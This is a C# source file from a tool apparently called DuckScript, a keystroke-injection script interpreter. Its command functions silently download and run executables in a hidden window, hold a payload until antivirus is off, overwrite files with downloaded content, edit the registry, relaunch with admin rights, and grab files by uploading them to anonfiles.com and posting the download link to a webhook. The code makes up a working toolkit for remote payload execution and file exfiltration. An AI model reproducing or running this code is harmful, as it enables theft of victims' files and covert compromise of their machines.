#region using
using Microsoft.CSharp;
using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
#endregion

namespace DuckScript
{
    class Commands
    {
        #region Commands
        public static void RunPayload(string path, string downloadurl, string arguments)
        {
            Program.payloadDownloaded = false;
            if (!path.Contains("\\"))
            {
                Program.wc.DownloadFileAsync(new Uri(downloadurl), Program.loc + @"\DuckScript\" + path);
                path = Program.loc + @"\DuckScript\" + path;
            }
            else
            {
                Program.wc.DownloadFileAsync(new Uri(downloadurl), path);
            }
            while (!Program.payloadDownloaded) { }
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = path;
            if (arguments != "") { startInfo.Arguments = arguments; }
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            if (arguments.ToLower() == "/checkantivirus")
            {
                if (!Global.IsAntiVirusOff())
                {
                    Process.Start(startInfo);
                    while (!Global.IsAntiVirusOff()) { Thread.Sleep(1000); }
                }
            }
            if (arguments.ToLower() != "/norun")
            {
                Process.Start(startInfo);
            }
        }

        public static void SpoofMac(string Mac)
        {
            if (Mac != "")
            {
                // not random
            }
            else
            {
                // random
            }
        }

        public static void playSound(string soundFile)
        {
            SoundPlayer player = new SoundPlayer(soundFile);
            player.Play();
        }

        public static void Until(string processName, string status)
        {
            redo:
            if (status.ToLower() == "open" || status.ToLower() == "opened")
            {
                Process[] prcs = Process.GetProcessesByName(processName);
                if (prcs.Length == 0) { goto redo; }
                else { return; }
            }
            else if (status.ToLower() == "close" || status.ToLower() == "closed")
            {
                Process[] prcs = Process.GetProcessesByName(processName);
                if (prcs.Length == 0) { return; }
                else { goto redo; }
            }
        }

        public static void RunOnlineScript(string scriptfile, string nosettings)
        {
            string script = "";
            if (File.Exists(scriptfile))
            {
                string[] data = { File.ReadAllText(scriptfile), nosettings.ToLower() };
                Thread tr = new Thread(new ThreadStart(() => Program.Main(data)));
                tr.Start();
                tr.Join();
                try { tr.Abort(); } catch { }
            }
            else
            {
                try
                {
                    script = Global.FixString(scriptfile).Replace(@"\%", "%");
                    string filename = Path.GetTempPath() + @"\" + Global.RandomString(8) + ".duck";
                    File.WriteAllText(filename, script);
                    string[] data = { filename, nosettings.ToLower() };
                    Thread tr = new Thread(new ThreadStart(() => Program.Main(data)));
                    tr.Start();
                    tr.Join();
                    try { tr.Abort(); } catch { }
                    File.Delete(filename);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    Console.ReadLine();
                }
            }
            Console.WriteLine("done");
            Console.ReadLine();
        }

        public static void SendKey(string content)
        {
            SendKeys.SendWait(Global.FixString(Global.FixKeys(content.Replace("\n", @"%ENTER%"))));
        }

        public static void FocusWindow(string windowname)
        {
            IntPtr hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == windowname)
                {
                    hWnd = pr.MainWindowHandle;
                    Program.ShowWindow(hWnd, 3);
                    Program.SetForegroundWindow(hWnd);
                    Thread.Sleep(10);
                }
            }
        }

        public static void SetWindowState(string windowname, string state, string location, string size)
        {
            IntPtr hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName.ToLower().Contains(windowname.ToLower()))
                {
                    hWnd = pr.MainWindowHandle;
                    Rectangle wnd;
                    Program.GetWindowRect(hWnd, out wnd);

                    int currentLocationX = wnd.X;
                    int currentLocationY = wnd.Y;
                    int currentSizeX = wnd.Width;
                    int currentSizeY = wnd.Height;
                    int newLocationX = Convert.ToInt32(location.Split(',')[0]);
                    int newLocationY = Convert.ToInt32(location.Split(',')[1]);
                    int newSizeX = Convert.ToInt32(size.Split(',')[0]);
                    int newSizeY = Convert.ToInt32(size.Split(',')[1]);

                    if (state.ToLower() == "size")
                    {
                        Program.MoveWindow(hWnd, currentLocationX, currentLocationY, newSizeX, newSizeY, true);
                    }
                    else if (state.ToLower() == "location")
                    {
                        Program.MoveWindow(hWnd, newLocationX, newLocationY, currentSizeX, currentSizeY, true);
                    }
                    else if (state.ToLower() == "both")
                    {
                        Program.MoveWindow(hWnd, newLocationX, newLocationY, newSizeX, newSizeY, true);
                    }
                }
            }
        }

        public static void UpdateSettings(string setting, string value)
        {
            if (setting.ToLower() == "webhook")
            {
                Settings.webhook = value;
            }
            else if (setting.ToLower() == "errorwebhook")
            {
                Settings.errorwebhook = value;
            }
            else if (setting.ToLower() == "username")
            {
                Settings.username = value;
            }
            else if (setting.ToLower() == "errors")
            {
                Settings.errors = value;
            }
            else if (setting.ToLower() == "debug")
            {
                Settings.debug = value;
            }
        }

        public static void SetRegKey(string location, string path, string keyname, string newvalue)
        {
            if (location.ToLower() == "localmachine")
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
            else if (location.ToLower() == "currentuser")
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
            else if (location.ToLower() == "user")
            {
                RegistryKey reg = Registry.Users.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
            else if (location.ToLower() == "classesroot")
            {
                RegistryKey reg = Registry.ClassesRoot.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
        }

        public static void DelRegKey(string path, string location, string keyname)
        {
            if (location.ToLower() == "localmachine")
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey(path);
                reg.DeleteValue(keyname);
                reg.Close();
            }
            else if (location.ToLower() == "currentuser")
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey(path);
                reg.DeleteValue(keyname);
                reg.Close();
            }
            else if (location.ToLower() == "user")
            {
                RegistryKey reg = Registry.Users.OpenSubKey(path);
                reg.DeleteValue(keyname);
                reg.Close();
            }
        }

        public static void ShowMessage(string content, string title)
        {
            MessageBox.Show(content, title);
        }

        public static void ShowNote(string filename, string content)
        {
            filename = filename.Replace(".txt", "");
            string path = Path.GetTempPath() + @"\" + filename + ".txt";
            File.WriteAllText(path, content);
            Process.Start(path);
            Thread.Sleep(1000);
            File.Delete(path);
        }

        public static void ModifyFile(string filePath, string downloadlink)
        {
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
                Program.wc.DownloadFile(downloadlink, filePath);
            }
        }

        public static void SendFile(string filePath)
        {
            string ReturnValue = "";
            int attempts = 0;
            try
            {
                retry:
                attempts++;
                if (File.Exists(filePath))
                {
                    byte[] Response = Program.wc.UploadFile("https://api.anonfiles.com/upload", filePath);
                    string ResponseBody = Encoding.ASCII.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                    {
                        ReturnValue += "There was a erorr while uploading the file.\r\n";
                        ReturnValue += "Error message: **" + ResponseBody.Split('"')[7] + "**\r\n";
                    }
                    else
                    {
                        ReturnValue += "Download link: **" + ResponseBody.Split('"')[15] + "**\r\n";
                        ReturnValue += "File name: **" + ResponseBody.Split('"')[25] + "**\r\n";
                    }
                    Global.sendWebHook(ReturnValue, Settings.username);
                }
                else
                {
                    if (attempts < 10)
                    {
                        Thread.Sleep(500);
                        goto retry;
                    }
                    else
                    {
                        ReturnValue = "File Grab failed since file did not exist at: **" + filePath + "**";
                        Global.sendWebHook(ReturnValue, Settings.username);
                    }
                }
            }
            catch
            {
                ReturnValue = "Failed to grab file at: **" + filePath + "**";
                Global.sendWebHook(ReturnValue, Settings.username);
            }
        }

        public static void Compile(string filename, string source)
        {
            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            ICodeCompiler icc = codeProvider.CreateCompiler();

            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = filename;
            CompilerResults results = icc.CompileAssemblyFromSource(parameters, source);
            if (results.Errors.Count > 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                foreach (CompilerError CompErr in results.Errors)
                {
                    Console.WriteLine($"Line number: {CompErr.Line}\n" +
                        $"Error Number: {CompErr.ErrorNumber}\n" +
                        $"'{CompErr.ErrorText};\n");
                }
            }
            else
            {
                Process.Start(filename);
            }
        }

        public static void RestartAsAdmin()
        {
            if (!Program.isAdmin)
            {
                Process proc = new Process();
                proc.StartInfo.FileName = Assembly.GetExecutingAssembly().Location;
                proc.StartInfo.Arguments = Program.scriptfile.Replace(" ", "*");
                proc.StartInfo.UseShellExecute = true;
                proc.StartInfo.Verb = "runas";
                proc.Start();
                Environment.Exit(0);
            }
        }

        public static void WriteToFile(string path, string content)
        {
            if (!File.Exists(path))
            {
                path = Path.Combine(Path.GetTempPath(), path.Replace(".txt", "") + ".txt");
                File.WriteAllText(path, content);
                Thread.Sleep(1000);
            }
        }
        #endregion
    }
}